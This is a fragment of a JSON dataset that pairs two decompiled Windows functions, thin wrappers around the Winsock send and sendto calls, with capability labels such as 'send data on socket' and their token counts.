        "decompiled_code": "\nvoid __thiscall fcn.00439a81(int32_t param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    (*_sym.imp.WS2_32.dll_send)(*(param_1 + 4), param_2, param_3, param_4);\n    return;\n}\n",
        "token_count": 72
    },
    "00439b0a": {
        "rules": [
            "send data on socket",
            "send data"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00439b0a(uint buf, uint len, uint to, uint tolen, uint flags)\n\n{\n    int32_t in_ECX;\n    \n    (*_sym.imp.WS2_32.dll_sendto)(*(in_ECX + 4), buf, len, flags, to, tolen);\n    return;\n}\n",
        "token_count": 75
    }
}